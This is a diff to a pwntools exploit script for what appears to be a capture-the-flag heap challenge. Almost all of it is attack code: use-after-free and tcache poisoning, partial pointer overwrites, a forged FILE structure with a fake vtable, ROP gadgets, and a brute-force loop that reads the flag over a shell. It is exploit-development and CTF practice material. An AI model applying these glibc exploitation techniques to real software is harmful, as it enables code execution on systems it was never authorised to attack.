@@ -1,9 +1,11 @@
 #!/usr/bin/env python3
 
 from pwn import *
-
 exe = ELF('chall_patched', checksec=False)
 libc = ELF('libc.so.6', checksec=False)
+# context.terminal = ["tmux", "splitw", "-h"]
+context.terminal = ["foot", "-e", "sh", "-c"]
+# context.terminal = ["kitty", "sh", "-c"]
 context.binary = exe
 
 info = lambda msg: log.info(msg)
@@ -50,6 +52,7 @@ def script():
 
     # uaf tcache
     # refund - prepare for tcache poison 3 times
+
     refund(3)
     refund(0)
     refund(2)
@@ -63,8 +66,8 @@ def script():
     refund(1)
     buy(2000)
 
-    edit(0, p16(0xa3a0)) 
-    edit(1, p16(0x96c8))
+    edit(0, p16(0xb3a0)) 
+    edit(1, p16(0x76c8))
 
     buy(236)
     buy(236)
@@ -92,8 +95,8 @@ def script():
     refund(6)
     refund(2)
 
-    edit(0, p16(0xa3a0))
-    edit(1, p16(0x96a0))
+    edit(0, p16(0xb3a0))
+    edit(1, p16(0x76a0))
 
     buy(236)
     buy(236)
@@ -119,7 +122,6 @@ def script():
     info("heap base: " + hex(heap_base))
     info("vtable fake: " + hex(fake_vtable))
 
-
     # fake vtable
 
     pop_rdi = 0x23b6a + libc.address
@@ -134,7 +136,6 @@ def script():
 
     edit(1,load)
 
-
     vtable_IO_wfile_overflow = 24 + libc.sym._IO_wfile_jumps_maybe_mmap - 0x38
     default = libc.sym._IO_2_1_stdout_ + 131
 
@@ -144,16 +145,10 @@ def script():
     """
     lock = heap_base + 0xc50
 
-
     fp = FileStructure()
 
     # fp.flags = 0x00000000fbad2887
-    # fp._IO_read_end = default
-    # fp._IO_write_ptr = default
-    # fp._IO_buf_end = default
-    # fp.fileno = 1
-    # fp._old_offset = 0
-    # fp._offset = 0
+ 
     fp._wide_data = fake_vtable
     fp._lock = libc.sym._IO_stdfile_1_lock
     fp.vtable = vtable_IO_wfile_overflow
@@ -164,14 +159,10 @@ def script():
 
     edit(6, bytes(fp))
 
-
-
-
-
 count = 0
 
-# while (count < 1):
-while(1):
+while (count < 1):
+# while(1):
     count+=1
 
     info(f'attemp {count}: ')
@@ -190,20 +181,20 @@ while(1):
                 c
                 ''')
                 sleep(1)
-        # GDB()
+        GDB()
 
         script()
 
     
-        sl(b'cat flag')
-        sl(b'cat flag.txt')
-        out = p.recv(timeout=5)
-        if b'{' in out:
-            p.interactive()
-            break
-        else:
-            p.close()
-            continue
+        # sl(b'cat flag')
+        # sl(b'cat flag.txt')
+        # out = p.recv(timeout=5)
+        # if b'{' in out:
+        #     p.interactive()
+        #     break
+        # else:
+        #     p.close()
+        #     continue
     except EOFError:
         p.close()
         continue
